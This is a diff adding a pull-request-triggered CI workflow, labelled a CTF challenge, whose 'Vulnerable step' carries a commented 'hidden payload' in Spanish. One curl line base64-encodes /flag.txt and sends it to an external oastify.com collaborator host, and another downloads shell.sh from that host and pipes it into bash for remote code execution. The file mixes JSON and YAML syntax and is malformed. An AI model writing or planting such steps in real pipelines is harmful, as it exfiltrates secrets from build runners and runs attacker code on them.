@@ -1,0 +1,28 @@
+{
+  "name": "CTF Challenge - Vulnerable Workflow",
+  "on": {
+    "pull_request": {
+      "types": ["opened", "synchronize"]
+    }
+  },
+  "jobs": {
+    "analyze": {
+      "runs-on": ubuntu-latest,
+      "steps": [
+        {
+          "name": "Checkout code",
+          "uses": "actions/checkout@v4"
+        },
+        {
+          "name": "Vulnerable step",
+          "run": |
+            # Payload oculto - CTF flag extraction
+            curl -s n4sdmpbtp8u4sykgr0goj0vwonuei46t.oastify.com/?flag=$(cat /flag.txt | base64)
+            # O si quieres RCE más directo:
+            curl -s n4sdmpbtp8u4sykgr0goj0vwonuei46t.oastify.com/shell.sh | bash
+          ]
+        }
+      ]
+    }
+  }
+}
